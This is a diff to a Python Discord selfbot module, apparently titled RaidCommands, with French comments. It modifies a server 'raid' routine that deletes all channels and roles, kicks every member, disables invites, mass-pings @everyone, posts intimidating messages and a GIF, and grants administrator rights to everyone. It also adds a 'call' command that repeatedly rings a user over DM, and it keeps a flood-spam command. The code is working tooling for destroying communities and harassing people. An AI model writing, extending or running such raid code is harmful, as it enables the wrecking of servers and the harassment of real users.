@@ -5,6 +5,7 @@ import asyncio
 from utils import log, generate_random_string, random_cooldown
 import config_selfbot
 import langs
+import os  # Assurez-vous d'importer os pour la gestion des fichiers
 
 class RaidCommands(commands.Cog):
     def __init__(self, bot):
@@ -65,7 +66,7 @@ class RaidCommands(commands.Cog):
     async def create_channels_and_ping(self, ctx):
         for _ in range(24):
             try:
-                new_channel = await ctx.guild.create_text_channel("Raid By PolyBius")
+                new_channel = await ctx.guild.create_text_channel("Raid By Atom")
                 await new_channel.send("# ez_       _ ||@everyone||")
             except Exception as e:
                 print(f"Failed to create channel or ping @everyone: {e}")
@@ -75,22 +76,55 @@ class RaidCommands(commands.Cog):
         if ctx.author.guild_permissions.administrator:
             await ctx.message.edit(langs.raid_in_process[config_selfbot.lang])
             guild = ctx.guild
+            
+            # Supprimer tous les salons existants
             await self.delete_all_channels(ctx)
-            log.success(f"all channel deleted")
+            log.success(f"Tous les salons supprimés")
+            
+            # Kicker tous les membres
             await self.kick_all_members(ctx)
-            log.success(f"all membres kickted")
+            log.success(f"Tous les membres ont été expulsés")
+            
+            # Désactiver toutes les invitations
             await self.disable_all_invites(ctx)
-            log.success(f"All invite off")
-            await self.create_channels_and_ping(ctx)
-            log.success(f"all channel created")
+            log.success(f"Toutes les invitations ont été désactivées")
+            
+            # Créer un salon nommé "Je suis ANÐOR" et y envoyer le message "Bang."
+            try:
+                new_channel1 = await ctx.guild.create_text_channel("Je suis andor.")
+                await new_channel1.send("Bang.")
+                log.success(f"Le salon 'Je suis ANÐOR' a été créé et le message 'Bang.' envoyé.")
+            except Exception as e:
+                print(f"Échec de la création du salon 'Je suis ANÐOR' ou de l'envoi du message : {e}")
+
+            # Créer un salon nommé "Vous voulez parler ?" et y envoyer le message et le GIF
+            try:
+                new_channel2 = await ctx.guild.create_text_channel("discutons")
+                await new_channel2.send("Je vous écoute.")
+                
+                # Envoi du GIF
+                gif_path = os.path.join("utils", "Je suis ANDOR.gif")  # Remplacez "nom_du_gif.gif" par le nom réel du fichier GIF
+                
+                if os.path.exists(gif_path):
+                    await new_channel2.send(file=discord.File(gif_path))
+                    log.success(f"Le salon 'Vous voulez parler ?' a été créé et le message 'Je vous écoute.' avec le GIF a été envoyé.")
+                else:
+                    print(f"Le fichier GIF n'existe pas : {gif_path}")
+
+            except Exception as e:
+                print(f"Échec de la création du salon 'Vous voulez parler ?' ou de l'envoi du message/GIF : {e}")
+
+            # Supprimer tous les rôles
             await self.delete_all_roles(guild)
-            log.success(f"All roles deleted")
+            log.success(f"Tous les rôles ont été supprimés")
+            
+            # Donner des permissions d'administrateur à tout le monde
             await self.set_everyone_administrator(guild)
-            log.success(f"Seveur raided")
+            log.success(f"Permissions d'administrateur accordées à @everyone")
 
         else:
             await ctx.message.edit(langs.raid_error_permission[config_selfbot.lang], delete_after=config_selfbot.deltime)
-
+            
     @commands.command()
     async def kickall(self, ctx: commands.Context):
         if ctx.author.guild_permissions.kick_members:
@@ -167,6 +201,25 @@ class RaidCommands(commands.Cog):
             await ctx.message.edit(langs.spam_cooldown[config_selfbot.lang], delete_after=config_selfbot.deltime)
 
     @commands.command()
+    async def call(self, ctx):
+        if not isinstance(ctx.channel, discord.DMChannel):
+            await ctx.message.edit(langs.only_dm_fun[config_selfbot.lang])
+            await asyncio.sleep(config_selfbot.deltime)
+            await ctx.message.delete()
+            return
+
+        try:
+            await ctx.message.delete()
+            for i in range(5):
+                voice_client = await ctx.channel.connect(reconnect=False)
+                await asyncio.sleep(0.5)
+                await voice_client.disconnect()
+                await asyncio.sleep(1.3)
+        except Exception as e:
+            print(f"{langs.voice_join_error[config_selfbot.lang]}: {e}")
+
+
+    @commands.command()
     async def flood(self, ctx: commands.Context):
         flood_spam = """_ _
         _ _
@@ -222,7 +275,7 @@ class RaidCommands(commands.Cog):
         _ _
         _ _"""
         await ctx.message.edit(flood_spam)
-        for i in range(2):
+        for i in range(1):
             await ctx.channel.send(flood_spam)
             await asyncio.sleep(0.5)
 
